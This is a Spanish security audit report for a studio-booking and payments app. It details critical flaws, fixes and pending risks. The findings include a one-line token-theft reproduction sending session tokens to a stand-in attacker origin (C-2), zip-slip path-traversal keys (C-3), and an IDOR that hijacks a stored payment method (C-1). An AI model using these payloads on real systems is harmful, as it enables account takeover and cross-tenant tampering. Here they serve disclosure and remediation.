# Auditoría Tentare — 21 de agosto de 2026 (13ª pasada)

**Base auditada:** `origin/main` en `1f77bd0c` (16 commits nuevos desde la pasada del 20-ago).
**Fixes:** rama `audit/2026-08-21`, commits `66d2ed9b` + `7a38cec1` (20 archivos).
**Checks:** typecheck PASS · lint PASS · 3163 tests verde (4 nuevos) · build NO VERIFICABLE en el sandbox.

---

## ESTADO REAL DE TENTARE

| Eje | Lectura |
|---|---|
| **Estado general** | El producto avanza rápido y el código nuevo está bien pensado. El problema no es la calidad media: es que **cada superficie nueva reabre un agujero que ya se había cerrado en su gemela**. |
| **Riesgo técnico** | Medio. Sin deuda estructural nueva; sí patrones que se repiten sin propagarse los arreglos. |
| **Riesgo de seguridad** | **Alto antes de esta pasada, medio después.** Tres 🔴 explotables sin autenticación previa o con una cuenta legítima. |
| **Riesgo de datos** | Medio. El aislamiento entre tenants se apoya en comprobaciones de aplicación, no en la BD: `suscripciones_socio_id_fkey` es una FK **simple** a `socios(id)`, no compuesta con `studio_id`. |
| **Riesgo de negocio** | Medio-alto y **sin cambios respecto al 20-ago**: los pagos siguen sin red de recuperación (ver §Pendientes). |
| **Deuda técnica** | Concentrada en tres sitios: el conciliador ciego al checkout embebido, la política de devolución de bono al cancelar una clase (sin decidir), y las escrituras optimistas del panel. |
| **Áreas más problemáticas** | Checkout de plan · puente de auth del widget · importador de temas ZIP · miniaturas del Theme Builder. |

### El patrón que domina esta pasada

Los tres 🔴 comparten forma:

> **Se arregla un endpoint y no su gemelo.**

- El 19-ago se cerró `socioId`-desde-el-body en `/api/public/checkout-embebido`. **`/api/stripe/checkout` tenía el mismo agujero y se quedó abierto.** El comentario del fix de aquel día incluso decía *«era el único endpoint… que no derivaba la identidad del JWT»* — y no lo era.
- El módulo de CORS del widget promete «solo estas webs pueden hablar con este estudio». El puente de auth, que es por donde salen **credenciales**, no consultaba esa lista.
- `lib/theme-preview-vars.ts` existe con un test guardián para que ninguna variable del tema se pierda en el preview. El guardián solo cubría **la mitad del vocabulario**.

**Recomendación de proceso (más valiosa que cualquiera de los fixes):** cuando se cierre una fuga, buscar a mano los hermanos del endpoint/módulo y cerrarlos en el mismo PR, o dejar un test que lo imponga. Tres pasadas seguidas encontrando la misma clase de fallo no es mala suerte.

---

# 🔴 CRÍTICOS

### [C-1] `/api/stripe/checkout` aceptaba un `socioId` ajeno en la compra de un plan

**Severidad:** 🔴 Crítico · **Área:** Pagos / multi-tenancy · **Estado: ✅ SOLUCIONADO**

**Archivo:** `app/api/stripe/checkout/route.ts:96` (antes del fix)

**Evidencia:**
```ts
let socioId: string | null = body.socioId ?? null;   // ← sin verificar nada
…
if (socioId) metadata.socioId = socioId;
```
El endpoint es **semipúblico por diseño** (una socia paga sin sesión de staff), sin ninguna comprobación de JWT, con rate limit de 10/min y CORS abierto a los dominios del widget.

**Qué ocurre:** ese `socioId` viaja por `metadata` de Stripe hasta `entregarPlanComprado`, que inserta `suscripciones` y `recibos` con él, y hasta el webhook (`app/api/stripe/webhook/route.ts:558-585`), que escribe `stripe_customer_id` y `stripe_payment_method_id` sobre esa fila de `socios`.

**Por qué ocurre:** la validación de pertenencia se hizo sobre el *plan* (`plan.studio_id !== body.studioId` → 403) pero no sobre el *socio*. Y la BD tampoco lo impedía: `suscripciones_socio_id_fkey` es una FK simple a `socios(id)`, no compuesta con `studio_id` — documentado en el propio repo tras la auditoría del 19-ago.

**Impacto:** pagando **con tarjeta propia**, un atacante podía (a) escribir bono, recibo y suscripción a nombre de otra socia, incluso de otro estudio; y (b) —lo grave— **sobrescribir el método de pago guardado de una socia ajena**, con lo que los cobros off-session posteriores del estudio irían a la tarjeta del atacante. Además, `esNueva: !socioId` se derivaba del mismo valor, así que el `soloNuevas` de los códigos de descuento (añadido ayer mismo) se saltaba omitiendo el campo.

**Solución aplicada:** puerto fiel del patrón del endpoint hermano. Si viene `body.socioId`, se exige JWT (`verificarUsuarioSupabase` + `socioAutenticado`); si no valida, 401/403. **Solo en la rama de PLAN**: en la de RECIBO el socio sale de `recibo.socio_id`, y exigir JWT allí rompería «Cobrar online» del panel y los enlaces de pago. Los tres llamantes reales pasan a mandar el Bearer del portal (`postCheckout` y el `fetch` de `/reservar/[slug]`; el widget ya lo mandaba).

**Verificación:** revisados uno a uno los cuatro emisores de `planId`+`socioId`; el panel de staff no usa este camino (`crearCheckoutPlan` solo aparece bajo `app/portal/**`). `Access-Control-Allow-Headers` ya incluía `Authorization`. Typecheck + 3163 tests verde.

---

### [C-2] El puente de auth del widget entregaba los tokens de la socia a cualquier web

**Severidad:** 🔴 Crítico · **Área:** Autenticación · **Estado: ✅ SOLUCIONADO**

**Archivo:** `app/widget-auth-retorno/page.tsx:33-47` (antes del fix)

**Evidencia:**
```tsx
const origenEstudio = searchParams.get('origenEstudio');
if (!origenEstudio) { setEstado('error'); return; }
const { data: { session } } = await supabasePortal.auth.getSession();
window.opener?.postMessage({
  tipo: 'tentare-widget-auth', ok: true,
  access_token: session.access_token, refresh_token: session.refresh_token,
}, origenEstudio!);
```

**Qué ocurre:** `origenEstudio` llegaba por query string y se usaba como `targetOrigin` **sin validarse contra nada**. Y `intentar()` no exigía que el enlace mágico se acabase de consumir en esa navegación: leía **la sesión que ya hubiera** en el `localStorage` de tentare.app — la del portal de la socia.

**Cómo reproducirlo:** desde cualquier web, tras un clic:
```js
window.open('<origen de Tentare>/widget-auth-retorno?slug=x&origenEstudio=https://evil.example')
```
Si la visitante tiene sesión de socia activa, la pestaña le devuelve al `opener` su `access_token` **y su `refresh_token`**.

**Impacto:** cuenta comprometida de forma **persistente** (el refresh token se renueva solo): datos personales, reservas y métodos de pago del portal.

**Nota honesta:** el comentario que había (*«viene del propio widget, no de datos ajenos»*) describía el caso feliz, no una garantía. Es un buen recordatorio de que un comentario que justifica una decisión de seguridad tiene que decir **qué la hace cierta**, no de dónde suele venir el dato.

**Solución aplicada:** la página pasa a ser un **server component** que resuelve el origen contra `studios.widget_dominios_autorizados` (`origenPermitido`, la misma lista blanca que gobierna el CORS del widget) y le pasa a la mitad cliente un destino ya validado, o `null`. El cliente nunca vuelve a leer la URL.

**Riesgo residual:** un estudio con la lista de dominios vacía no puede autenticar por este camino — pero tampoco podía antes: sin whitelist el Modo B ya estaba muerto, porque `conCorsWidget` no emite cabeceras y el navegador bloquea la respuesta. No es una regresión de producto.

---

### [C-3] Zip-slip cross-tenant en el importador de temas

**Severidad:** 🔴 Crítico · **Área:** Almacenamiento / multi-tenancy · **Estado: ✅ SOLUCIONADO**

**Archivos:** `lib/theme-import/zip-parser.ts:74-79` + `app/api/theme/importar-zip/route.ts:63,74` + `lib/r2.ts:99,107`

**Evidencia:** los nombres de entrada del ZIP se usaban tal cual para componer la clave de R2, y esa clave acaba dentro de un `new URL(...)`, que **colapsa los `..` antes de firmar y antes de enviar el PUT**. Ejecutado:
```
temas-importados/S/ID/../../OTRO/ID2/index.html   → /bucket/temas-importados/OTRO/ID2/index.html
temas-importados/S/ID/../../../backups/OTRO/b.json → /bucket/backups/OTRO/b.json
```
El único saneado existente era el de `__MACOSX/` y ficheros ocultos, que no mira los `..`.

**Impacto:** una propietaria con plan Estudio (basta un ZIP estático HTML+CSS «compatible») podía **sobrescribir el tema publicado de otro estudio, o su snapshot de backup** — mismo bucket. La firma AWS se calcula sobre la URL ya normalizada, así que el PUT se ejecuta con éxito.

**Solución aplicada:** módulo puro `lib/ruta-segura.ts` con `rutaConTravesia()`, aplicado en dos capas — se rechaza el ZIP entero en `descomprimirTema` (antes de tocar R2) y se vuelve a comprobar en `subirObjetoR2`, que es el único punto por el que pasan **todas** las subidas de objetos. Se comprueba la ruta y no el pathname de la URL a propósito: comparar pathnames rechazaría claves legítimas con espacios o acentos, que el importador sí produce. **2 tests de regresión** (`lib/ruta-segura.test.ts`), uno por cada dirección.

---

# 🟠 IMPORTANTES

### [I-1] El cupo SEMANAL contaba clases canceladas — ✅ SOLUCIONADO

**Área:** Reservas · **Archivo:** RPC `reservar_plaza` en producción

Verificado con `pg_get_functiondef` sobre **la definición real en producción** (no sobre el repo, que en este proyecto no es fuente de verdad): el conteo semanal no filtra `sesiones.cancelada`. El propio repo lo tenía anotado como pendiente en `lib/booking-logic.ts:78-80`.

Si el estudio cancela una clase, esa reserva sigue comiendo el cupo de la socia toda la semana; y como la limpieza de reservas es best-effort en cliente (ver I-2), basta con que falle una vez para que reciba un `LIMITE_SEMANAL` que no entiende — o gaste una **recuperación** para saltárselo. La defensa que se añadió el 20-ago en `contarReservasActivasFuturas` solo cubre el tope de *simultáneas*, que se calcula en TypeScript.

**Fix:** migración `20260821090000_cupo_semanal_ignora_clases_canceladas.sql`. El resto del cuerpo se copia **literal** de la definición vigente en producción; el único cambio es `and coalesce(ss.cancelada, false) = false`. Cotejado línea a línea por un revisor independiente (firma, `security definer`, `search_path`, orden de locks, nombres de variables, columnas del insert).

⚠️ **Requiere aplicarse a producción.** No se ha ejecutado desde aquí.

### [I-2] `cancelarReservasDeSesiones` era fire-and-forget y el toast mentía — ✅ SOLUCIONADO

**Archivos:** `lib/studio-context.tsx:2455`, `app/(dashboard)/calendario/page.tsx:1262`

```ts
cancelarReservasDeSesiones([sesionId], 'cancelarSesion');   // sin await
setSesionId(null);
showToast('Clase cancelada · clientas avisadas');           // pase lo que pase
```
Si el UPDATE fallaba, la propietaria leía «Clase cancelada» y **volvían a existir las reservas fantasma** que el commit del día anterior fue a arreglar, en silencio y sin siquiera un contador. Ahora la función es `async`, devuelve `ResultadoEscritura` y el toast dice la verdad — **en los dos llamantes**: `cancelarSerieDesde` también se había quedado sin `await` (lo encontró la revisión independiente).

⚠️ Se ha respetado el invariante del repo: las reservas se cancelan **después** de avisar, porque `avisarClaseCancelada` resuelve destinatarios en servidor filtrando `estado='CONFIRMADA'`.

### [I-3] `asignarSpot` / `liberarSpot`: escritura optimista sin revertir — ⚠️ PARCIALMENTE SOLUCIONADO

**Archivo:** `lib/studio-context.tsx:3211-3224`

Escribían de forma optimista sin `await` ni revert, con un índice único **real** que puede rechazarlas (`uq_reserva_spot_activo` sobre `(sesion_id, spot_id)`). Dos personas del staff asignando el mismo reformer dejaban la pantalla enseñando una asignación que la BD había rechazado. Además `find` no filtraba por estado y podía enganchar una reserva `CANCELADA` de la misma socia, escribiendo el spot en la fila equivocada.

**Hecho:** ambas son `async`, devuelven el resultado, revierten al valor anterior si la BD rechaza, y `asignarSpot` filtra `estado !== 'CANCELADA'`.

**Lo que queda:** los tipos de prop de los consumidores (`components/calendario/panel-sesion.tsx:44-45`, `components/spots/spot-map.tsx:13`) son `=> void` y **nadie lee el error**. Resultado para el staff: antes la pantalla mentía en silencio; ahora la plaza vuelve sola a su sitio, también en silencio. La mitad de datos está arreglada; la mitad de UX (un toast con el motivo) requiere tocar la cadena de props del panel y se deja documentada en vez de hacerse a ciegas.

### [I-4] Las miniaturas de la Biblioteca de temas pintaban el tema equivocado — ✅ SOLUCIONADO

**Archivos:** `components/theme/theme-library.tsx:333`, `components/theme/theme-thumb-vivo.tsx:79`

Las cinco miniaturas compartían el **color de marca del tema publicado**, no el del tema que dicen enseñar — el síntoma exacto que `lib/theme-preview-vars.ts:78-84` documenta como arreglado para `--portal-*` y que seguía abierto para el vocabulario del kit. Y la Biblioteca es la pantalla cuyo propósito declarado es «la miniatura no PUEDE mentir».

Dos causas encadenadas: `theme-thumb-vivo` no mandaba `varsKitMap` (así que el listener borraba propiedades que nunca estuvieron en línea → no-op → ganaba el `:root:root` del servidor), y —esto lo encontró la revisión independiente— **`def.defaults` no trae `themeId`**, así que la config heredaba el `'classic'` de `DEFAULT_THEME`, que no está en `TEMAS_PORTAL`, y `varsKitMap` devolvía `{}` de todas formas. Medido antes: `kit = 0` claves en las 6 filas. Después: `kit = 12..14`, con `--brand` propio por tema.

### [I-5] La whitelist del kit del preview tenía 6 claves de menos y 1 muerta — ✅ SOLUCIONADO

`CLAVES_KIT_PERMITIDAS` estaba escrita a mano, pero `varsEscalaSobreTema` deriva los `--size-*` de `tema.designSystem.type`, distinto por tema. Comparado contra los 5 temas: fuera de la whitelist `--size-body`, `--size-caption`, `--size-meta`, `--size-micro`, `--size-pass-number`, `--size-timer`; y `--size-pass-name`, `--size-detail-label`, `--size-section-title` no existen en ningún tema. Efecto: tocar la escala tipográfica cambiaba el cuerpo, los metadatos y el número del bono **en producción y no en la vista previa**.

**Por qué no lo cazó el guardián:** el test comparaba `themeToCssVars` contra su whitelist, pero **no existía el equivalente para `varsKitMap`**. Ahora los `--size-*` se derivan del registro (un tema nuevo entra solo) y hay dos tests guardián para el kit, en las dos direcciones.

### [I-6] El webhook de Twilio fallaba mudo en una feature que es una medición — ✅ SOLUCIONADO

`app/api/webhooks/twilio-inbound/route.ts` — los cinco caminos de error devolvían un código y nada más: cero Sentry, cero log. Importa porque el resultado de esta medición **decide si se construye el inbox**: si `NEXT_PUBLIC_APP_URL` no coincide exactamente con lo configurado en la consola de Twilio (apex vs `www`, barra final), todos los webhooks dan 403 y la tabla se queda a cero — y «cero filas» es indistinguible de «ninguna socia responde». **Comprobado en producción: hay 0 filas.** El modo de fallo produce justo la respuesta que cierra el proyecto.

**Fix:** `Sentry.captureMessage` en los tres caminos relevantes, registrando la URL usada para firmar (no es secreta) y nunca los `params`, que llevan el cuerpo del mensaje y el teléfono.

⚠️ En la primera versión del fix quité también el fallback `new URL(request.url).origin`. **La revisión independiente lo revirtió**: `docs/DEPLOY.md` dice literalmente que `NEXT_PUBLIC_APP_URL` «no es imprescindible», no hay `.env.example` ni bloque `env` en `vercel.json`, y ~30 sitios del repo la leen con fallback — quitarlo habría convertido el endpoint en un **403 permanente**.

### [I-7] `revoke` ausente en las dos tablas nuevas del 20-ago — ✅ SOLUCIONADO

Comprobado en producción: `has_table_privilege('authenticated', 'codigos_descuento_consumos', 'INSERT')` = `true`, ídem `mensajes_entrantes_medicion`. Hoy no hay fuga (RLS activa con cero policies deniega todo), pero es la segunda barrera que `0094_revoke_grants_deny_by_default.sql` estableció como criterio del proyecto, y las dos migraciones la invocan en un comentario sin ejecutarla. Migración `20260821091000`.

---

# 🟠 IMPORTANTES — PENDIENTES (no tocados)

### [P-1] Cancelar una clase NO devuelve el bono — ⏳ PENDIENTE (decisión de producto)

**Severidad:** 🟠, con potencial de 🔴 · **Archivos:** `app/api/sustituciones/route.ts:370-374`, `lib/supabase-data.ts:2504-2514`

Los tres caminos por los que el **estudio** cancela una clase hacen un `UPDATE` plano a `CANCELADA` sin tocar el saldo. El cron por mínimo de asistentes **sí** devuelve (`lib/db/supabase-data-admin.ts:2078-2081`). Misma situación, resultado opuesto según qué botón se pulse.

La instructora cae enferma → el estudio cancela → **la socia se queda sin clase y sin la sesión del bono**. Si era su última sesión, además ya se le generó el recibo de renovación.

**Por qué no se ha arreglado:** el propio código lo marca como *«decisión de producto pendiente»* en tres sitios. Devolver el bono cambia comportamiento de negocio con efecto en dinero y en la contabilidad del estudio; no es derivable del código. **Es la decisión más importante que Marco tiene pendiente en este informe.**

**Recomendación:** unificar hacia «cancelar una clase siempre devuelve», que es lo que la socia espera y lo que ya hace el cron. Extraer el bucle de `cancelarSesionPorMinimoNoAlcanzado:2073-2081` a un helper de servidor y llamarlo desde los tres caminos. El de panel no puede hacerlo en cliente sin descuadre: debe pasar por una ruta admin.

### [P-2] Los pagos siguen sin red de recuperación — ⏳ PENDIENTE (arrastrado del 20-ago)

Verificado que sigue igual:
- El webhook responde 200 **antes** de procesar (`after()`, `app/api/stripe/webhook/route.ts:154`), así que **Stripe no reintenta**.
- El conciliador solo recorre `stripe.checkout.sessions.list` (`lib/inngest/conciliar-cobros.ts:71`), así que **no ve el checkout embebido**, que crea un PaymentIntent suelto. Tampoco maneja reembolsos ni disputas.

Cobrado-y-no-entregado por ese camino hoy **solo se detecta si la clienta se queja**. Es el riesgo de negocio de mayor esperanza matemática que queda abierto.

### [P-3] Reserva y consumo de crédito no son atómicos — ⏳ PENDIENTE

`lib/db/supabase-data-admin.ts:1610-1636`: la RPC inserta la reserva y **después**, en un viaje aparte, se consume el bono. Verificados los 4 llamantes: ninguno descuenta antes de insertar, así que **no hay «crédito perdido»** — el riesgo es el inverso, clase servida sin cobrar. Está instrumentado (`:838-861`) pero no compensado, y si el proceso muere entre ambos no queda ni el `reportDbError`. Fix correcto: mover el consumo dentro de `reservar_plaza`. No se toca en esta pasada: es un cambio de transaccionalidad en el camino más caliente del producto.

### [P-4] La lista de espera promueve sin comprobar crédito ni topes — ⏳ PENDIENTE

`20260819120000_promocionar_espera_solo_clases_vivas.sql:62-64` solo comprueba que la clase esté viva. Después, `consumirBonoServidor` devuelve `false` sin bloquear nada si no hay bono (`supabase-data-admin.ts:822-823`). Una socia cuyo bono caducó mientras estaba en cola entra **CONFIRMADA gratis**; tampoco se revalidan `limite_semanal` ni `maxSimultaneas`. No se puede promover a una clase llena (eso sí está bien resuelto). Requiere decidir qué hacer con esa socia (saltarla, dejarla en espera, avisarla): decisión de producto.

### [P-5] Sesión de la socia en el `localStorage` del dominio del estudio — ⏳ PENDIENTE

`lib/db/supabase-portal.ts:24-35` monta el cliente con `persistSession: true` **dentro del documento del estudio** (Modo B). El Shadow DOM aísla CSS, no JS ni storage: el token queda legible por cualquier script de esa página (plugin de WordPress, píxel de analítica, tag de ads). Con el refresh token se impersona a la socia de forma indefinida. Arreglarlo bien implica decidir entre sesión efímera en memoria o mover el flujo autenticado a un iframe de tentare.app: cambio de arquitectura, no de una línea.

### [P-6] Sin `frame-ancestors` / `X-Frame-Options` en todo el repo — ⏳ PENDIENTE

Cero apariciones de `Content-Security-Policy`, `frame-ancestors` o `X-Frame-Options`; `next.config.ts` no define `headers()` y no hay `middleware.ts`. Cualquier web puede embeber `/reservar/<slug>?embed=1` de cualquier estudio. Como el iframe es same-origin respecto a tentare.app, arrastra la sesión de la socia → clickjacking sobre acciones reales, y el snippet generado lleva `allow="payment"`. Fix: CSP `frame-ancestors` construido desde `widget_dominios_autorizados`. Es un cambio de cabeceras globales y merece su propio PR con pruebas.

### [P-7] Zip bomb en el importador de temas — ⏳ PENDIENTE

`lib/theme-import/zip-parser.ts:35-47`: el límite de 25 MB se comprueba sobre el **comprimido**; luego `unzipSync` descomprime todo en memoria sin límite, y el tope de 500 ficheros se aplica **después**. Mitigante parcial: el límite de body de Vercel (~4,5 MB). Un bomb de 4,5 MB sigue expandiendo a decenas de GB → OOM. Fix correcto: unzip en streaming con corte por ratio; cambio de librería/enfoque, no seguro a ciegas.

---

# 🟡 MEJORAS (documentadas, no aplicadas)

| ID | Qué | Dónde |
|---|---|---|
| M-1 | 7 reservas fantasma históricas en producción (jul–3 ago), todas de clases **ya pasadas**. El fix del 20-ago detuvo la hemorragia; nunca hubo backfill. Sin impacto vivo. | prod |
| M-2 | Un código de descuento del 100 % deja `importe = 0` y el checkout responde 409 «Importe no válido». Un código de bienvenida gratuito es imposible de usar y el mensaje no lo explica. | `app/api/stripe/checkout/route.ts` |
| M-3 | El consumo del código es «como mucho una vez»: si el `INSERT` en `codigos_descuento_consumos` gana pero la RPC falla, un reintento choca por 23505 y el uso no se cuenta nunca. Queda en Sentry. | `webhook/route.ts:529` |
| M-4 | Las respuestas 429 de los endpoints públicos salen **sin cabeceras CORS**: cross-origin el widget ve un error de red genérico en vez de «demasiadas peticiones». | `app/api/public/*/route.ts` |
| M-5 | El identificador que decide CORS (query) está desacoplado del que usa la lógica (body). Impacto real bajo (sin credenciales ambientales), pero la propiedad que el módulo promete no se cumple. | `lib/cors-widget.ts:59-65` |
| M-6 | El snippet generado escucha `message` sin comprobar `e.origin`, y el emisor usa `postMessage(…, '*')`. Cualquier frame de la página del estudio puede redimensionar el iframe. | `tab-api.tsx:657` |
| M-7 | `data-color` es la única puerta de color sin validar por `COLOR_VALIDO`. Lo controla el propio estudio, así que es bajo. | `widget-bundle/main.tsx:278` |
| M-8 | `mensajes_entrantes_medicion` guarda cuerpo y teléfono en claro, **sin TTL ni purga**, y el borrado GDPR de `/api/socios/eliminar` no la alcanza (no tiene `socio_id` ni `studio_id`). La migración la llama «temporal, 2-3 semanas». | migración + `route.ts:60` |
| M-9 | `themeId` es `z.string()`: `PUT /api/theme` acepta un id inexistente con 200 y degrada en silencio. `themeIdSeguro()` existe pero solo se llama en un sitio. | `theme-schema.ts:370` |
| M-10 | Página huérfana `configuracion/apariencia/editor-zip/[id]` navegable por URL tras `f8439e57`; nadie enlaza a ella. | `app/(dashboard)/…` |
| M-11 | `hoyISO` se calcula en UTC en servidor: entre las 00:00 y las 02:00 de Madrid, «hoy» es ayer y un bono caducado sigue vigente 1-2 h. Existe ya el patrón correcto en `notifications/emit.ts:91`. | `supabase-data-admin.ts:1561` |
| M-12 | El widget usa la TZ del **navegador**, no la del estudio, para los filtros de franja y día. Cosmético; las comparaciones que deciden reservabilidad son en ms absolutos y están bien. | `lib/reservar/construir-slots.ts` |
| M-13 | `contarReservasActivasFuturas` consulta sesiones futuras sin `.limit()`: con >1000 sesiones futuras y el default de PostgREST, subcontaría. No verificado el límite efectivo. | `supabase-data-admin.ts:1559` |
| M-14 | La casilla de privacidad de `19b146ff` no viaja al servidor: no hay registro de *esa* aceptación concreta a efectos del art. 7.1 RGPD. El consentimiento sí se registra por el mecanismo del contrato. | `app/reservar/[slug]/page.tsx:1178` |

---

# MAPA DE DEUDA TÉCNICA

| Área | Estado | Riesgo | Prioridad |
|---|---|---|---|
| Arquitectura | Sólida en lo nuevo; los arreglos no se propagan a los módulos gemelos | Medio | Proceso, no código |
| Frontend | Escrituras optimistas sin revert (I-3 a medias); errores que no llegan a la UI | Medio | 3 |
| Backend | Bien; el hueco era la identidad en el checkout de plan (cerrado) | Bajo tras C-1 | — |
| Base de datos | FK simples permiten cruzar tenants si la app falla; RPC con locks bien puestos | Medio | 4 |
| RLS | Correcta donde se revisó (`codigos_descuento`, `studios`, `theme_imports`). Faltaban los `revoke` (cerrado) | Bajo | — |
| Auth | C-2 era grave; cerrado. Queda el token en el `localStorage` del estudio (P-5) | Medio | 2 |
| Pagos | C-1 cerrado, pero **sin red de recuperación** (P-2) | **Alto** | **1** |
| Reservas | I-1/I-2 cerrados; atomicidad (P-3) y lista de espera (P-4) abiertos | Medio | 3 |
| Calendario | Correcto en canceladas/pasadas; TZ del estudio no existe (por diseño) | Bajo | — |
| Automatizaciones | No auditado en profundidad esta pasada | No verificado | — |
| UX | Toasts que mentían (cerrado); errores de spot que siguen sin llegar (I-3) | Medio | 3 |
| Rendimiento | No auditado esta pasada; P0-29 del informe de escalabilidad sigue abierto | No verificado | — |
| Seguridad | 3 🔴 cerrados; P-6 (frame-ancestors) y P-7 (zip bomb) abiertos | Medio | 2 |
| Tests | 3163 verdes y guardianes útiles; el del kit no existía (creado) | Bajo | — |
| Infraestructura | `NEXT_PUBLIC_APP_URL` sin garantizar y sin `.env.example` | Medio | 4 |

---

# PLAN DE LIMPIEZA

**FASE 1 — CRÍTICOS.** Desplegar `audit/2026-08-21` y **aplicar las dos migraciones**. Decidir P-1 (devolución de bono al cancelar clase).
**FASE 2 — ESTABILIZACIÓN.** P-2 (conciliador que vea el checkout embebido + reembolsos/disputas). P-6 (CSP `frame-ancestors`). M-8 (purga de la tabla de medición).
**FASE 3 — REFACTORIZACIÓN.** P-3 (consumo de bono dentro de `reservar_plaza`). P-5 (sesión del widget fuera del origen del estudio). I-3 (errores de spot hasta la UI).
**FASE 4 — CALIDAD.** M-11/M-12 (zonas horarias). M-4/M-5/M-6 (CORS y postMessage). M-13 (paginación).
**FASE 5 — MEJORAS.** El resto de la tabla 🟡.

---

# REPARACIONES REALIZADAS

| ID | Problema | Archivo(s) | Verificación | Estado |
|---|---|---|---|---|
| C-1 | `socioId` del body en compra de plan | `api/stripe/checkout/route.ts`, `lib/api-client.ts`, `app/reservar/[slug]/page.tsx` | 4 llamantes revisados uno a uno; tsc+lint+3163 tests | ✅ |
| C-2 | Tokens a cualquier origen | `app/widget-auth-retorno/{page,cliente}.tsx` | Firma `searchParams` cotejada con 8 páginas del repo; Modo A no usa la ruta | ✅ |
| C-3 | Zip-slip cross-tenant | `lib/ruta-segura.ts`, `zip-parser.ts`, `lib/r2.ts` | 2 tests nuevos; travesía reproducida y luego rechazada | ✅ |
| I-1 | Cupo semanal cuenta canceladas | migración `20260821090000` | Cotejo línea a línea contra `pg_get_functiondef` de prod | ✅ (sin aplicar) |
| I-2 | Toast que mentía / fire-and-forget | `studio-context.tsx`, `calendario/page.tsx` | Invariante «avisar antes de cancelar» verificado en los 2 caminos | ✅ |
| I-3 | Spot optimista sin revert | `studio-context.tsx` | tsc; props siguen siendo `=> void` | ⚠️ parcial |
| I-4 | Miniaturas con el color del tema publicado | `theme-library.tsx`, `theme-thumb-vivo.tsx` | Medido: `kit` 0 → 12-14 claves, `--brand` propio por tema | ✅ |
| I-5 | Whitelist del kit incompleta | `theme-preview-vars.ts` + test | 2 tests guardián nuevos, en las dos direcciones | ✅ |
| I-6 | Webhook de Twilio mudo | `webhooks/twilio-inbound/route.ts` | Fallback de URL y 503 conservados tras la revisión | ✅ |
| I-7 | `revoke` ausente | migración `20260821091000` | Privilegios confirmados en prod antes | ✅ (sin aplicar) |

## PROBLEMAS PARCIALMENTE SOLUCIONADOS

| ID | Qué se arregló | Qué queda | Motivo |
|---|---|---|---|
| I-3 | Revert de datos + filtro de estado | El error no llega a la UI: las props son `=> void` | Tocar la cadena de props del panel sin poder probarlo en navegador |

## PROBLEMAS PENDIENTES

| ID | Severidad | Por qué no se arregló | Próximo paso |
|---|---|---|---|
| P-1 | 🟠→🔴 | Decisión de producto con efecto en dinero | Marco decide política de devolución |
| P-2 | 🟠 | Cambio de arquitectura del conciliador | PR propio con pruebas contra Stripe |
| P-3 | 🟠 | Transaccionalidad en el camino más caliente | Mover consumo a `reservar_plaza` |
| P-4 | 🟠 | Decisión de producto (qué hacer con la socia sin bono) | Definir y luego implementar |
| P-5 | 🟠 | Cambio de arquitectura de la sesión del widget | Elegir entre sesión efímera o iframe |
| P-6 | 🟠 | Cabeceras globales, riesgo de romper embeds legítimos | CSP desde `widget_dominios_autorizados` |
| P-7 | 🟠 | Requiere unzip en streaming | Cambiar enfoque de descompresión |

---

# RESUMEN FINAL

**Problemas encontrados:** 🔴 3 · 🟠 14 · 🟡 14 = **31**

- **Solucionados:** 9 (3 🔴 + 6 🟠)
- **Parcialmente solucionados:** 1 (I-3)
- **Pendientes:** 21
- **No verificados:** 3 (Sentry no consultado esta pasada; caché de Vercel en `/api/public/aforo`; si `/portal/[slug]` acaba en el Full Route Cache de Next 16)

**Archivos modificados:** 20 · **Tests nuevos:** 4 · **Tests ejecutados:** 3163 · **Tests fallidos:** 0

| Check | Resultado |
|---|---|
| Typecheck | **PASS** |
| Lint | **PASS** |
| Tests | **PASS** (3163) |
| Build | **NO VERIFICADO** — el sandbox no alcanza `fonts.googleapis.com` y `next/font` falla. El bundle del widget sí compila (`public/widget.js`, 421 kb). Sin errores de build ajenos a las fuentes. |
| E2E | **NO EJECUTADO** — requiere navegador y servidor levantado |

### ESTADO REAL POST-AUDITORÍA

**Cómo estaba al empezar.** Tres agujeros críticos abiertos, los tres del mismo tipo: una superficie nueva que reabre un fallo ya cerrado en su gemela. El peor —el `socioId` del checkout de plan— permitía sobrescribir el método de pago guardado de una socia ajena; llevaba abierto al menos desde el 19 de agosto, día en que se cerró el mismo agujero en el endpoint de al lado con un comentario que afirmaba que era el único.

**Qué se ha cerrado.** Los tres 🔴 y seis 🟠, con tests de regresión donde tenía sentido ponerlos. Todos verificados: la travesía de rutas se reprodujo antes de saneada, el conteo semanal se cotejó contra la definición real de producción, y el fix de las miniaturas se midió (0 → 12-14 claves).

**Lo que sigue abierto y de verdad importa.** Dos cosas, ninguna arreglable sin una decisión tuya:

1. **Cancelar una clase no devuelve el bono** (P-1). La socia pierde la clase y la sesión pagada, salvo que la cancele el cron, que sí devuelve. Es un descuadre de dinero visible para la clienta y decidirlo cuesta cinco minutos.
2. **Los pagos no tienen red de recuperación** (P-2). Sin reintentos de Stripe y con el conciliador ciego al checkout embebido, un cobrado-y-no-entregado por ese camino solo se detecta si la clienta se queja. Es lo que más caro puede salir con cientos de estudios.

**Nivel de confianza.** Alto en lo que se ha tocado — cada fix está verificado por evidencia propia y revisado por un segundo par de ojos independiente, que encontró que **3 de los 9 estaban mal con todos los checks en verde** (uno era un no-op completo, otro habría dejado el webhook de Twilio en 403 permanente, y un tercero se había dejado la mitad del arreglo). Esos tres se corrigieron y se volvieron a verificar. Medio-bajo en lo que no se ha podido ejecutar: build, E2E y el comportamiento real en navegador de los cambios del Theme Builder.

**Lo que no puedo afirmar.** Que no haya más problemas. No he auditado en profundidad automatizaciones, CRM, rendimiento ni el motor de sustituciones esta pasada, y no he consultado Sentry. La conclusión se limita a lo revisado.

**Antes de ponerlo delante de cientos de estudios:** desplegar esta rama, aplicar las dos migraciones, decidir P-1, y cerrar P-2. El resto puede ir por fases.
